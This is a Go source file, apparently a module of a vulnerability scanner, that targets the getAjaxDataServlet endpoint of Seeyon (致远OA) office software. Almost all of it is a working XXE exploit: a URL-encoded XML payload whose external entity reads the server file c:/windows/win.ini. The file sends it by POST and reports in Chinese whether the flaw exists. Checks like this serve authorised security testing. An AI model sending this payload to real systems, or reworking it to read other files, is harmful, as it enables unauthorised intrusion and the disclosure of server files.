package A8_getAjaxDataServlet_xxe

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func Run(url string) {
	vulnUrl := url + "/seeyon/m-signature/RunSignature/run/getAjaxDataServlet"
	data := "S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "application/x-www-form-urlencoded",
		}).
		SetBodyString(data).
		Post(vulnUrl)

	if err == nil && resp.StatusCode == 200 && strings.Contains(resp.String(), "[]") {
		color.Green.Println("[+]	致远OA getAjaxDataServlet XXE漏洞存在 -> ", url)
	} else {
		color.Red.Println("[-]	致远OA getAjaxDataServlet XXE漏洞不存在")
	}
}
